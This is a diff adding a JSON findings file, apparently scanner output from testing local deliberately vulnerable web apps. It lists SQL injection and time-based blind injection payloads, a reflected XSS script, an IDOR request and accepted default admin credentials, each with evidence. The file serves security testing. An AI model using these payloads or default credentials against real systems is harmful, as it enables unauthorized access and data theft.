@@ -1,0 +1,47 @@
+[
+  {
+    "type": "SQLi",
+    "url": "http://localhost/vulnerabilities/sqli/",
+    "parameter": "id",
+    "payload": "1' OR '1'='1' -- ",
+    "evidence": "MySQL error: You have an error in your SQL syntax near ''1'='1''",
+    "severity": "Critical",
+    "timestamp": "2025-06-01T14:32:00Z"
+  },
+  {
+    "type": "SQLi",
+    "url": "http://localhost/vulnerabilities/sqli_blind/",
+    "parameter": "id",
+    "payload": "1' AND SLEEP(5) -- ",
+    "evidence": "Response delayed by 5.2 seconds (baseline: 0.3s) — time-based blind SQLi confirmed",
+    "severity": "Critical",
+    "timestamp": "2025-06-01T14:42:30Z"
+  },
+  {
+    "type": "XSS",
+    "url": "http://localhost/vulnerabilities/xss_r/",
+    "parameter": "name",
+    "payload": "<script>alert('XSS')</script>",
+    "evidence": "Payload rendered unescaped in response body: <script>alert('XSS')</script>",
+    "severity": "High",
+    "timestamp": "2025-06-01T14:35:12Z"
+  },
+  {
+    "type": "IDOR",
+    "url": "http://localhost:3000/api/Users/3",
+    "parameter": "userId",
+    "payload": "3",
+    "evidence": "Response 200 OK with full user profile JSON (expected 403 Forbidden)",
+    "severity": "High",
+    "timestamp": "2025-06-01T14:38:45Z"
+  },
+  {
+    "type": "BrokenAuth",
+    "url": "http://localhost/login.php",
+    "parameter": "username/password",
+    "payload": "admin:password",
+    "evidence": "Default credentials accepted — full admin access granted immediately",
+    "severity": "Critical",
+    "timestamp": "2025-06-01T14:40:00Z"
+  }
+]
